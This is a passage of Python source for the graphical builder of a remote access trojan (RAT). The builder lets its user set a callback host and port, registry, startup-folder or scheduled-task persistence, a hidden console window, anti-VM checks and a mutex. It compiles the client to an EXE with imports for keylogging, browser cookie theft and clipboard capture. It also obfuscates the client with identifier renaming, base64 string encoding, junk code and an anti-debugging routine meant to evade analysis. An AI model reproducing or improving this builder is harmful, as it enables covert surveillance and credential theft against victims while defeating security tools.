        self.obfuscation_value.pack(side=tk.LEFT, padx=5)
        
        # Update the label when slider changes
        self.obfuscation_var.trace_add("write", 
                                      lambda *args: self.obfuscation_value.configure(
                                          text=str(self.obfuscation_var.get())))
        
        # Stealth options
        stealth_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        stealth_frame.pack(fill=tk.X, padx=5, pady=5)
        self.theme_widgets.append(stealth_frame)
        
        stealth_label = ctk.CTkLabel(stealth_frame, text="Stealth Options", 
                                   font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        stealth_label.pack(anchor="w", padx=10, pady=5)
        
        # Persistence
        persistence_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        persistence_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.persistence_var = tk.BooleanVar(value=self.build_options["persistence"])
        persistence_checkbox = ctk.CTkCheckBox(persistence_frame, text="Add Persistence", 
                                             variable=self.persistence_var,
                                             onvalue=True, offvalue=False,
                                             checkbox_width=20,
                                             checkbox_height=20,
                                             command=self.toggle_persistence_options,
                                             fg_color=theme["accent_color"])
        persistence_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(persistence_checkbox)
        
        # Persistence method
        method_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        method_frame.pack(fill=tk.X, padx=10, pady=5)
        
        method_label = ctk.CTkLabel(method_frame, text="Persistence Method:", width=150)
        method_label.pack(side=tk.LEFT, padx=5)
        
        self.persistence_method_var = tk.StringVar(value=self.build_options["persistence_method"])
        method_dropdown = ctk.CTkOptionMenu(method_frame, values=["registry", "startup_folder", "scheduled_task"],
                                          variable=self.persistence_method_var,
                                          fg_color=theme["button_color"],
                                          button_color=theme["button_color"],
                                          button_hover_color=theme["hover_color"])
        method_dropdown.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(method_dropdown)
        
        # Startup name
        startup_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        startup_frame.pack(fill=tk.X, padx=10, pady=5)
        
        startup_label = ctk.CTkLabel(startup_frame, text="Startup Name:", width=150)
        startup_label.pack(side=tk.LEFT, padx=5)
        
        self.startup_name_entry = ctk.CTkEntry(startup_frame, width=200)
        self.startup_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.startup_name_entry.insert(0, self.build_options["startup_name"])
        self.theme_widgets.append(self.startup_name_entry)
        
        # Hide console
        console_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        console_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.hide_console_var = tk.BooleanVar(value=self.build_options["hide_console"])
        hide_console_checkbox = ctk.CTkCheckBox(console_frame, text="Hide Console Window", 
                                              variable=self.hide_console_var,
                                              onvalue=True, offvalue=False,
                                              checkbox_width=20,
                                              checkbox_height=20,
                                              fg_color=theme["accent_color"])
        hide_console_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(hide_console_checkbox)
        
        # Anti-VM
        antivm_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        antivm_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.antivm_var = tk.BooleanVar(value=self.build_options["anti_vm"])
        antivm_checkbox = ctk.CTkCheckBox(antivm_frame, text="Anti-VM (Don't run in virtual machines)", 
                                        variable=self.antivm_var,
                                        onvalue=True, offvalue=False,
                                        checkbox_width=20,
                                        checkbox_height=20,
                                        fg_color=theme["accent_color"])
        antivm_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(antivm_checkbox)
        
        # Mutex (prevent multiple instances)
        mutex_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        mutex_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.mutex_var = tk.BooleanVar(value=self.build_options["mutex_enabled"])
        mutex_checkbox = ctk.CTkCheckBox(mutex_frame, text="Use Mutex (Prevent multiple instances)", 
                                       variable=self.mutex_var,
                                       onvalue=True, offvalue=False,
                                       checkbox_width=20,
                                       checkbox_height=20,
                                       command=self.toggle_mutex_options,
                                       fg_color=theme["accent_color"])
        mutex_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(mutex_checkbox)
        
        # Mutex name
        mutex_name_frame = ctk.CTkFrame(stealth_frame, fg_color="transparent")
        mutex_name_frame.pack(fill=tk.X, padx=10, pady=5)
        
        mutex_name_label = ctk.CTkLabel(mutex_name_frame, text="Mutex Name:", width=150)
        mutex_name_label.pack(side=tk.LEFT, padx=5)
        
        self.mutex_name_entry = ctk.CTkEntry(mutex_name_frame, width=200)
        self.mutex_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.mutex_name_entry.insert(0, self.build_options["mutex_name"])
        self.theme_widgets.append(self.mutex_name_entry)
        
        # # Feature Selection
        # features_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        # features_frame.pack(fill=tk.X, padx=5, pady=5)
        # self.theme_widgets.append(features_frame)
        
        # features_label = ctk.CTkLabel(features_frame, text="Features to Include", 
        #                             font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        # features_label.pack(anchor="w", padx=10, pady=5)
        
        # # Create checkboxes for each feature
        # self.feature_vars = {}
        # features_container = ctk.CTkFrame(features_frame, fg_color="transparent")
        # features_container.pack(fill=tk.X, padx=10, pady=5)
        
        # # Left column
        # left_features = ctk.CTkFrame(features_container, fg_color="transparent")
        # left_features.pack(side=tk.LEFT, fill=tk.Y, expand=True)
        
        # # Right column
        # right_features = ctk.CTkFrame(features_container, fg_color="transparent")
        # right_features.pack(side=tk.RIGHT, fill=tk.Y, expand=True)
        
        # # Add features to columns
        # feature_columns = [
        #     # Left column
        #     (left_features, [
        #         ("screenshot", "Screen Capture"),
        #         ("keylogger", "Keylogger"),
        #         ("audio", "Audio Capture"),
        #         ("process_manager", "Process Manager")
        #     ]),
        #     # Right column
        #     (right_features, [
        #         ("file_transfer", "File Transfer"),
        #         ("advanced_monitoring", "Advanced Monitoring"),
        #         ("remote_desktop", "Remote Desktop Control")
        #     ])
        # ]
        
        # for column, features in feature_columns:
        #     for feature_id, feature_name in features:
        #         self.feature_vars[feature_id] = tk.BooleanVar(value=self.build_options["features"].get(feature_id, True))
        #         feature_checkbox = ctk.CTkCheckBox(column, text=feature_name, 
        #                                          variable=self.feature_vars[feature_id],
        #                                          onvalue=True, offvalue=False,
        #                                          checkbox_width=20,
        #                                          checkbox_height=20,
        #                                          fg_color=theme["accent_color"])
        #         feature_checkbox.pack(anchor="w", padx=5, pady=3)
        #         self.theme_widgets.append(feature_checkbox)
        
        # Build buttons
        button_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        build_py_btn = ctk.CTkButton(button_frame, text="Build Python Script", 
                                   command=lambda: self.build_client(compile_exe=False),
                                   fg_color=theme["button_color"],
                                   hover_color=theme["hover_color"])
        build_py_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.theme_widgets.append(build_py_btn)
        
        build_exe_btn = ctk.CTkButton(button_frame, text="Build EXE", 
                                    command=lambda: self.build_client(compile_exe=True),
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"])
        build_exe_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.theme_widgets.append(build_exe_btn)
        
        # === RIGHT PANEL - Preview and logs ===
        # Create notebook for tabs
        right_notebook = ttk.Notebook(right_panel)
        right_notebook.pack(fill=tk.BOTH, expand=True)
        
        # # Preview tab
        # preview_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
        # right_notebook.add(preview_frame, text="Code Preview")
        
        # # Code preview
        # self.code_preview = scrolledtext.ScrolledText(preview_frame, wrap=tk.WORD,
        #                                             background=theme["bg_color"],
        #                                             foreground=theme["fg_color"],
        #                                             font=("Consolas", 10))
        # self.code_preview.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        # self.theme_text_widgets.append(self.code_preview)
        
        # Build log tab
        log_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
        right_notebook.add(log_frame, text="Build Log")
        
        # Build log
        self.build_log = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD,
                                                 background=theme["bg_color"],
                                                 foreground=theme["fg_color"],
                                                 font=("Consolas", 10))
        self.build_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_text_widgets.append(self.build_log)
        
        # Requirements tab
        req_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
        right_notebook.add(req_frame, text="Requirements")
        
        # Requirements text
        self.req_text = scrolledtext.ScrolledText(req_frame, wrap=tk.WORD,
                                               background=theme["bg_color"],
                                               foreground=theme["fg_color"],
                                               font=("Consolas", 10))
        self.req_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_text_widgets.append(self.req_text)
        
        # Fill requirements
        self.req_text.insert(tk.END, "To build working RAT clients, you need:\n\n")
        self.req_text.insert(tk.END, "1. Python 3.6+ installed on your system\n")
        self.req_text.insert(tk.END, "2. PyInstaller for EXE compilation (pip install pyinstaller)\n")
        self.req_text.insert(tk.END, "3. Required client libraries (listed below)\n\n")
        self.req_text.insert(tk.END, "Required Python libraries for the client:\n")
        self.req_text.insert(tk.END, "- socket\n- threading\n- zlib\n- io\n- cv2 (OpenCV)\n")
        self.req_text.insert(tk.END, "- numpy\n- pyaudio\n- PIL (Pillow)\n- pynput\n- psutil\n")
        self.req_text.insert(tk.END, "- scapy (for network capture)\n- ctypes (for Windows features)\n")
        self.req_text.insert(tk.END, "- win32clipboard (for clipboard monitoring)\n")
        self.req_text.insert(tk.END, "- browser_cookie3 (for browser data extraction)\n")
        self.req_text.insert(tk.END, "- pyautogui (for remote desktop control)\n\n")
        self.req_text.insert(tk.END, "To install all required libraries:\n")
        self.req_text.insert(tk.END, "pip install opencv-python numpy pyaudio pillow pynput psutil scapy pywin32 browser-cookie3 pyautogui")
        self.req_text.configure(state="disabled")
        
        # Initialize UI state
        self.toggle_persistence_options()
        self.toggle_mutex_options()
        
        # Register with theme manager
        self.register_with_theme_manager()
    
    def toggle_persistence_options(self):
        """Enable/disable persistence options based on checkbox state"""
        if self.persistence_var.get():
            self.persistence_method_var.set(self.build_options["persistence_method"])
            self.startup_name_entry.configure(state="normal")
        else:
            self.startup_name_entry.configure(state="disabled")
    
    def toggle_mutex_options(self):
        """Enable/disable mutex options based on checkbox state"""
        if self.mutex_var.get():
            self.mutex_name_entry.configure(state="normal")
        else:
            self.mutex_name_entry.configure(state="disabled")
    
    def use_current_settings(self):
        """Use the current server settings for the client"""
        if hasattr(self.rat_app, 'ip'):
            self.host_entry.delete(0, tk.END)
            self.host_entry.insert(0, self.rat_app.ip)
        
        if hasattr(self.rat_app, 'port'):
            self.port_entry.delete(0, tk.END)
            self.port_entry.insert(0, str(self.rat_app.port))
    
    def browse_output_dir(self):
        """Browse for output directory"""
        directory = filedialog.askdirectory(title="Select Output Directory")
        if directory:
            self.outdir_entry.delete(0, tk.END)
            self.outdir_entry.insert(0, directory)
    
    def browse_icon_file(self):
        """Browse for icon file"""
        icon_file = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if icon_file:
            self.icon_entry.delete(0, tk.END)
            self.icon_entry.insert(0, icon_file)
    
    # def load_client_template(self):
    #     """Load the client template code"""
    #     try:
    #         # First check if we have an embedded template in the script
    #         embedded_template = self.get_embedded_template()
    #         if embedded_template:
    #             self.client_code = embedded_template
    #             self.log_message("Loaded embedded client template")
    #         elif os.path.exists(self.client_template_path):
    #             # Load from external file if available
    #             with open(self.client_template_path, 'r') as f:
    #                 self.client_code = f.read()
    #             self.log_message(f"Loaded client template from {self.client_template_path}")
    #         else:
    #             # Extract template from paste-2.txt if available
    #             self.client_code = self.extract_client_code_from_paste()
    #             if self.client_code:
    #                 self.log_message("Extracted client template from paste file")
    #             else:
    #                 self.log_message("Error: Could not find client template", is_error=True)
    #                 messagebox.showerror("Template Error", "Could not find client template code.")
    #                 return
            
    #         # Update the preview
    #         self.update_code_preview()
            
    #     except Exception as e:
    #         self.log_message(f"Error loading template: {str(e)}", is_error=True)
    #         messagebox.showerror("Template Error", f"Error loading client template: {str(e)}")
    
    # def update_code_preview(self):
    #     """Update the code preview with the current template"""
    #     self.code_preview.configure(state="normal")
    #     self.code_preview.delete(1.0, tk.END)
        
    #     # Add formatted code to the preview
    #     if self.client_code:
    #         # Show only first 500 lines to improve performance
    #         lines = self.client_code.split('\n')[:500]
    #         preview_text = '\n'.join(lines)
    #         if len(lines) < len(self.client_code.split('\n')):
    #             preview_text += "\n\n[... truncated for performance ...]"
                
    #         self.code_preview.insert(tk.END, preview_text)
    #     else:
    #         self.code_preview.insert(tk.END, "No client code template loaded.")
            
    #     self.code_preview.configure(state="disabled")

    def get_embedded_template(self):
        """Get the embedded client template if available"""
        # This would be filled in with a base64-encoded template if you embed it
        # Currently returns None
        return None
    
    def extract_client_code_from_paste(self):
        return self.client_code

            
    def log_message(self, message, is_error=False):
        """Add a message to the build log"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        prefix = "[ERROR] " if is_error else "[INFO] "
        log_entry = f"[{timestamp}] {prefix}{message}\n"
        
        # Add to the log display
        self.build_log.configure(state="normal")
        if is_error:
            # Apply tag for error messages if needed
            current_pos = self.build_log.index(tk.END)
            self.build_log.insert(tk.END, log_entry)
            self.build_log.tag_add("error", current_pos, f"{current_pos}+{len(log_entry)}c")
            self.build_log.tag_config("error", foreground="red")
        else:
            self.build_log.insert(tk.END, log_entry)
        
        self.build_log.see(tk.END)
        self.build_log.configure(state="disabled")
        
        # Add to the list for later reference
        self.build_logs.append(log_entry)
        
        # Also log to console for debugging
        print(log_entry.strip())
        
    def build_client(self, compile_exe=False):
        """Build the client based on current settings"""
        if self.is_building:
            messagebox.showinfo("Build in Progress", "A build is already in progress. Please wait.")
            return
            
        # Clear build log
        self.build_log.configure(state="normal")
        self.build_log.delete(1.0, tk.END)
        self.build_log.configure(state="disabled")
        self.build_logs = []
        
        # Update and validate options
        self.update_build_options()
        
        # Override compile option if explicitly set
        if compile_exe:
            self.build_options["compile_to_exe"] = True
            
        # Validate options
        errors = self.validate_build_options()
        if errors:
            error_msg = "Cannot build client due to the following errors:\n\n" + "\n".join(errors)
            self.log_message(error_msg, is_error=True)
            messagebox.showerror("Build Error", error_msg)
            return
            
        # Start build in a separate thread to keep UI responsive
        self.is_building = True
        build_thread = threading.Thread(target=self._build_client_thread)
        build_thread.daemon = True
        build_thread.start()
        
    def _build_client_thread(self):
        """Worker thread for building the client"""
        try:
            self.log_message("Starting client build process...")
            
            # Check if client template is loaded
            if not self.client_code:
                self.is_building = False
                self.load_client_template()
                if not self.client_code:
                    self.log_message("Error: No client template available", is_error=True)
                    return
            
            # Get configuration for client
            host = self.build_options["host"]
            port = self.build_options["port"]
            obfuscation_level = self.build_options["obfuscation"]
            
            self.log_message(f"Building client with configuration:")
            self.log_message(f"  - Host: {host}:{port}")
            self.log_message(f"  - Obfuscation: Level {obfuscation_level}")
            
            # Create the modified client code
            modified_code = self.customize_client_code()
            
            # Apply obfuscation if requested
            if obfuscation_level > 0:
                self.log_message(f"Applying obfuscation (Level {obfuscation_level})...")
                modified_code = self.obfuscate_code(modified_code, obfuscation_level)
            
            # Generate output file path
            output_filename = self.build_options["file_name"]
            if not output_filename.endswith('.py'):
                output_filename += '.py'
                
            output_path = os.path.join(self.build_options["output_dir"], output_filename)
            
            # Write the Python file
            with open(output_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(modified_code)
                
            self.log_message(f"Python client written to: {output_path}")
            
            # Compile to EXE if requested
            if self.build_options["compile_to_exe"]:
                self.compile_to_exe(output_path)
            
            self.log_message("Client build completed successfully!")
            
            # Show success message
            self.rat_app.root.after(0, lambda: messagebox.showinfo("Build Complete", 
                f"Client built successfully!\n\nOutput: {output_path}"))
        
        except Exception as e:
            self.log_message(f"Error building client: {str(e)}", is_error=True)
            # Show error in GUI thread
            self.rat_app.root.after(0, lambda: messagebox.showerror("Build Error", 
                f"Error building client: {str(e)}"))
        
        finally:
            self.is_building = False
            
    def update_build_options(self):
        """Collect all options from the UI into the build_options dictionary"""
        # Connection settings
        self.build_options["host"] = self.host_entry.get()
        try:
            self.build_options["port"] = int(self.port_entry.get())
        except ValueError:
            self.build_options["port"] = 4444
        
        # Build settings
        self.build_options["file_name"] = self.filename_entry.get()
        self.build_options["output_dir"] = self.outdir_entry.get()
        self.build_options["icon_path"] = self.icon_entry.get()
        self.build_options["obfuscation"] = self.obfuscation_var.get()
        self.build_options["compile_to_exe"] = self.compile_var.get()
        
        # Stealth options
        self.build_options["persistence"] = self.persistence_var.get()
        self.build_options["persistence_method"] = self.persistence_method_var.get()
        self.build_options["startup_name"] = self.startup_name_entry.get()
        self.build_options["hide_console"] = self.hide_console_var.get()
        self.build_options["anti_vm"] = self.antivm_var.get()
        self.build_options["mutex_enabled"] = self.mutex_var.get()
        self.build_options["mutex_name"] = self.mutex_name_entry.get()
        
        # # Features
        # for feature_id, var in self.feature_vars.items():
        #     self.build_options["features"][feature_id] = var.get()
    
    def validate_build_options(self):
        """Validate the build options before starting the build"""
        errors = []
        
        # Check host and port
        if not self.build_options["host"]:
            errors.append("Host cannot be empty")
        
        try:
            port = int(self.build_options["port"])
            if port < 1 or port > 65535:
                errors.append("Port must be between 1 and 65535")
        except ValueError:
            errors.append("Port must be a valid number")
        
        # Check file name
        if not self.build_options["file_name"]:
            errors.append("File name cannot be empty")
            
        # Check output directory
        if not os.path.exists(self.build_options["output_dir"]):
            try:
                os.makedirs(self.build_options["output_dir"])
            except:
                errors.append("Invalid output directory")
        
        # Check icon file if specified
        if self.build_options["icon_path"] and not os.path.exists(self.build_options["icon_path"]):
            errors.append("Icon file not found")
        
        # Return errors if any, otherwise None
        return errors if errors else None
    
    
    def compile_to_exe(self, python_file_path):
        """Compile the Python script to an executable using PyInstaller"""
        self.log_message("Starting compilation to EXE...")
        
        try:
            import subprocess
            import os
            import sys
            
            # Get output directory (same as the Python file)
            output_dir = os.path.dirname(python_file_path)
            file_name = os.path.basename(python_file_path)
            file_base_name = os.path.splitext(file_name)[0]
            
            # Check if PyInstaller is installed
            try:
                subprocess.run(["pyinstaller", "--version"], 
                            check=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE)
            except (subprocess.SubprocessError, FileNotFoundError):
                self.log_message("PyInstaller not found. Attempting to install...", is_error=True)
                
                try:
                    # Try to install PyInstaller using pip
                    pip_command = [sys.executable, "-m", "pip", "install", "pyinstaller"]
                    self.log_message(f"Running: {' '.join(pip_command)}")
                    
                    install_process = subprocess.run(pip_command, 
                                                    check=True, 
                                                    stdout=subprocess.PIPE, 
                                                    stderr=subprocess.PIPE)
                    
                    self.log_message("PyInstaller installed successfully")
                except subprocess.SubprocessError as e:
                    self.log_message(f"Failed to install PyInstaller: {e}", is_error=True)
                    self.log_message("Please install PyInstaller manually: pip install pyinstaller", is_error=True)
                    raise Exception("PyInstaller not available. Please install it manually.")
            
            # Build arguments for PyInstaller
            pyinstaller_args = [
                "pyinstaller",
                "--onefile",  # Create a single executable
                "--clean",    # Clean cache before building
                "--noconsole" if self.build_options["hide_console"] else "",  # Hide console if requested
            ]
            
            # Add icon if specified
            if self.build_options["icon_path"] and os.path.exists(self.build_options["icon_path"]):
                pyinstaller_args.append(f"--icon={self.build_options['icon_path']}")
                self.log_message(f"Using icon: {self.build_options['icon_path']}")
            
            # Add hidden imports for used modules
            hidden_imports = [
                "socket", "threading", "time", "struct", "os", "random", 
                "io", "zlib", "numpy", "pyaudio", "PIL.ImageGrab", "PIL.Image",
                "tkinter", "pynput", "pynput.keyboard", "ctypes", "psutil", "json", "pyautogui", "scapy.all",
                "win32clipboard", "browser_cookie3", "winreg", "cv2", ""
            ]
            
            # Add imports based on enabled features
            # if self.build_options["features"]["screenshot"]:
            #     hidden_imports.extend(["cv2"])
            
            # if self.build_options["features"]["advanced_monitoring"]:
            #     hidden_imports.extend(["scapy.all", "win32clipboard", "browser_cookie3", "winreg"])
            
            # if self.build_options["features"]["remote_desktop"]:
            #     hidden_imports.extend(["pyautogui"])
            
            # Add each hidden import to the arguments
            for imp in hidden_imports:
                pyinstaller_args.append(f"--hidden-import={imp}")
            
            # Add the Python file to compile
            pyinstaller_args.append(python_file_path)
            
            # Filter out empty arguments
            pyinstaller_args = [arg for arg in pyinstaller_args if arg]
            
            # Execute PyInstaller
            self.log_message(f"Running PyInstaller with arguments: {' '.join(pyinstaller_args)}")
            
            # Create a temporary file to capture output
            log_file_path = os.path.join(output_dir, "pyinstaller_log.txt")
            
            with open(log_file_path, 'w') as log_file:
                process = subprocess.Popen(
                    pyinstaller_args,
                    stdout=log_file,
                    stderr=subprocess.STDOUT,
                    cwd=output_dir,
                    universal_newlines=True
                )
                
                # Update log periodically
                while process.poll() is None:
                    self.log_message("Compiling... (this may take a few minutes)")
                    
                    # Read the current log content
                    with open(log_file_path, 'r') as f:
                        log_content = f.read()
                        lines = log_content.splitlines()
                        
                        # Extract recent progress updates if available
                        recent_lines = lines[-5:] if len(lines) > 5 else lines
                        for line in recent_lines:
                            if line.strip() and not line.startswith(" "):
                                self.log_message(f"PyInstaller: {line}")
                    
                    # Wait before checking again
                    for _ in range(5):  # Check every 5 seconds
                        if process.poll() is not None:
                            break
                        time.sleep(1)
            
            # Check if compilation was successful
            return_code = process.poll()
            
            if return_code == 0:
                # Get the path to the generated EXE
                exe_path = os.path.join(output_dir, "dist", f"{file_base_name}.exe")
                
                if os.path.exists(exe_path):
                    # Move the EXE to the output directory
                    final_exe_path = os.path.join(output_dir, f"{file_base_name}.exe")
                    if os.path.exists(final_exe_path):
                        os.remove(final_exe_path)
                    
                    import shutil
                    shutil.move(exe_path, final_exe_path)
                    
                    # Clean up build files if successful
                    build_dir = os.path.join(output_dir, "build")
                    dist_dir = os.path.join(output_dir, "dist")
                    spec_file = os.path.join(output_dir, f"{file_base_name}.spec")
                    
                    if os.path.exists(build_dir):
                        shutil.rmtree(build_dir)
                    if os.path.exists(dist_dir):
                        shutil.rmtree(dist_dir)
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                    
                    self.log_message(f"Compilation successful! EXE created at: {final_exe_path}")
                    return final_exe_path
                else:
                    self.log_message("Compilation appeared to succeed but EXE not found", is_error=True)
                    
                    # Try to find the actual exe
                    for root, _, files in os.walk(output_dir):
                        for file in files:
                            if file.endswith('.exe') and file_base_name in file:
                                full_path = os.path.join(root, file)
                                self.log_message(f"Found executable at: {full_path}")
                                return full_path
                    
                    raise Exception("EXE file not found after compilation")
            else:
                # Read the PyInstaller log for error information
                with open(log_file_path, 'r') as f:
                    log_content = f.read()
                
                # Look for error messages in the log
                error_lines = []
                for line in log_content.splitlines():
                    if "error:" in line.lower() or "traceback" in line.lower():
                        error_lines.append(line)
                
                error_summary = "\n".join(error_lines[-10:]) if error_lines else "Unknown error"
                self.log_message(f"Compilation failed with return code {return_code}", is_error=True)
                self.log_message(f"Error details: {error_summary}", is_error=True)
                
                raise Exception(f"PyInstaller failed with return code {return_code}")
        
        except Exception as e:
            self.log_message(f"Error compiling to EXE: {str(e)}", is_error=True)
            raise
    
    # A complete solution for the string obfuscation that handles all edge cases

    def obfuscate_code(self, code, level=1):
        """Obfuscate the client code at the specified level"""
        self.log_message(f"Applying level {level} obfuscation...")
        
        if level == 0:
            return code  # No obfuscation
        
        import random
        import base64
        import re
        
        # Original code backup
        original_code = code
        
        try:
            # Level 1: Basic variable and function renaming
            if level >= 1:
                self.log_message("Level 1: Renaming variables and functions...")
                
                # Don't rename these
                preserved = [
                    'self', 'socket', 'threading', 'time', 'struct', 'os', 'random', 
                    'io', 'zlib', 'cv2', 'numpy', 'pyaudio', 'PIL', 'ImageGrab', 'Image',
                    'tkinter', 'pynput', 'keyboard', 'sys', 'ctypes', 'datetime', 
                    'psutil', 'json', 'subprocess', 'main', '__init__', '__main__', '__name__',
                    'name', 'connect', 'target', 'start', 'family', 'filter', 'append', 'exist_ok',
                    'errors', 'shell', 'stdout', 'stdin', 'size', 'dirs', 'stderr', 'output', 'text',
                    'timeout', 'subkey', 'format', 'channels', 'rate', 'input', 'exception_on_overflow', 'interval',
                    'cpu_percent', 'attrs', 'limit', 'version', 'value', 'encoding', 'processes', 'type', 'rel_y',
                    'rel_x', 'startup_items', 'client_socket', 'control_socket', 'udp_socket', 'users', 'hostname', 'command',
                    'install_date', 'cursor', 'number', 'data', 'bookmarks', 'cookies', 'mutex', 'on_press', 'daemon', 'stop',
                    'store'
                ]
                
                # Find all function and variable names to replace
                function_pattern = r'def\s+([a-zA-Z_][a-zA-Z0-9_]*)'
                variable_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)\s*='

                
                functions = set(re.findall(function_pattern, code))
                variables = set(re.findall(variable_pattern, code))
                
                # Filter out preserved names and short names
                functions = [f for f in functions if f not in preserved and len(f) > 3]
                variables = [v for v in variables if v not in preserved and len(v) > 3]
                
                # Create random replacements
                replacements = {}
                for name in functions + variables:
                    if name not in replacements and name not in preserved:
                        # Use confusing names with similar characters
                        obf_chars = "OQIlRP"
                        obf_name = ''.join(random.choice(obf_chars) for _ in range(random.randint(5, 8)))
                        replacements[name] = obf_name
                
                print(replacements)
                # Replace the names
                for original, obfuscated in replacements.items():
                    # Use word boundaries to avoid partial replacements
                    pattern = r'\b' + re.escape(original) + r'\b'
                    code = re.sub(pattern, obfuscated, code)
            
            # Level 2: String encoding and code structure changes
            if level >= 2:
                self.log_message("Level 2: String encoding and code structure changes...")
                
                # Add base64 import if not already there
                if 'import base64' not in code:
                    code = 'import base64\n' + code
                
                # First, handle f-strings differently
                # Find all f-strings and temporarily replace them
                fstring_pattern = r'f"([^"\\]*(\\.[^"\\]*)*)"'
                fstrings = re.findall(fstring_pattern, code)
                fstring_placeholders = {}
                
                for i, fstring in enumerate(fstrings):
                    placeholder = f"__FSTRING_PLACEHOLDER_{i}__"
                    fstring_content = fstring[0]
                    fstring_placeholders[placeholder] = f'f"{fstring_content}"'
                    code = code.replace(f'f"{fstring_content}"', placeholder)
                
                # Preserve multi-line comments and docstrings
                docstring_pattern = r'"""(.*?)"""'
                docstrings = []
                
                def save_docstring(match):
                    docstrings.append(match.group(0))
                    return f"__DOCSTRING_PLACEHOLDER_{len(docstrings)-1}__"
                
                code = re.sub(docstring_pattern, save_docstring, code, flags=re.DOTALL)
                
                # First, process assignment operations to prevent syntax errors
                # Find variable assignments with string literals
                assignment_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*(r?b?)(".*?")'
                
                def process_assignment(match):
                    var_name = match.group(1)
                    prefix = match.group(2)
                    string_literal = match.group(3)
                    
                    # Skip empty strings
                    if string_literal == '""' or string_literal == "''":
                        return f"{var_name} = {prefix}{string_literal}"
                    
                    # Extract content without quotes
                    content = string_literal[1:-1]
                    encoded = base64.b64encode(content.encode('utf-8')).decode('utf-8')
                    
                    if prefix == 'b':
                        return f"{var_name} = base64.b64decode(\"{encoded}\".encode(\"utf-8\"))"
                    else:
                        return f"{var_name} = base64.b64decode(\"{encoded}\").decode(\"utf-8\")"
                
                # Process assignments first
                code = re.sub(assignment_pattern, process_assignment, code)
                
                # Now encode all other string literals
                string_pattern = r'(r?b?)"([^"\\]*(\\.[^"\\]*)*)"'
                
                def encode_string(match):
                    prefix = match.group(1)  # Captures 'r', 'b', 'rb', or empty string
                    s = match.group(2)
                    
                    # Special handling for empty strings
                    if s == "":
                        if prefix == 'b':
                            return f'b""'
                        elif prefix == 'r':
                            return f'r""'
                        elif prefix == 'rb' or prefix == 'br':
                            return f'rb""'
                        else:
                            return f'""'
                    
                    # Normal handling for non-empty strings
                    encoded = base64.b64encode(s.encode('utf-8')).decode('utf-8')
                    
                    # Handle different string prefixes
                    if prefix == 'b':
                        # Byte string
                        return f'base64.b64decode("{encoded}".encode("utf-8"))'
                    elif prefix == 'r':
                        # Raw string
                        return f'base64.b64decode("{encoded}").decode("utf-8")'
                    elif prefix == 'rb' or prefix == 'br':
                        # Raw byte string
                        return f'base64.b64decode("{encoded}".encode("utf-8"))'
                    else:
                        # Regular string
                        return f'base64.b64decode("{encoded}").decode("utf-8")'
                
                # Replace remaining string literals with encoded versions
                code = re.sub(string_pattern, encode_string, code)
                
                # Restore f-strings
                for placeholder, fstring in fstring_placeholders.items():
                    code = code.replace(placeholder, fstring)
                
                # Restore docstrings
                for i, doc in enumerate(docstrings):
                    code = code.replace(f"__DOCSTRING_PLACEHOLDER_{i}__", doc)
                
                # Add some junk functions that never get called
                junk_functions = [
                    '\ndef _' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8)) + '():\n    return "' +
                    ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(20)) + '"\n'
                    for _ in range(5)
                ]
                code = code + '\n' + '\n'.join(junk_functions)
                
                # Add code flow obfuscation
                code = code.replace("if __name__ == \"__main__\":", 
                                f"""
    _x = lambda: None
    _y = lambda: main()
    if __name__ == "____main__" + "_"[0]:
        _vars = {{
            "x": _x,
            "y": _y
        }}
        _vars["y"]()
    """)
            
            # Level 3: [Code for level 3 stays the same]
            if level >= 3:
                self.log_message("Level 3: Adding encryption layer and anti-analysis techniques...")
                
                # Add anti-debugging code
                anti_debug_code = """
def _check_debugger():
    import ctypes
    import sys
    import time
    import random
    
    # Simple timing check (debuggers affect execution time)
    start = time.time()
    for i in range(1000):
        random.random()
    end = time.time()
    
    if end - start > 0.1:  # Execution took too long (might be debugged)
        sys.exit(0)
    
    # Check for debugger on Windows
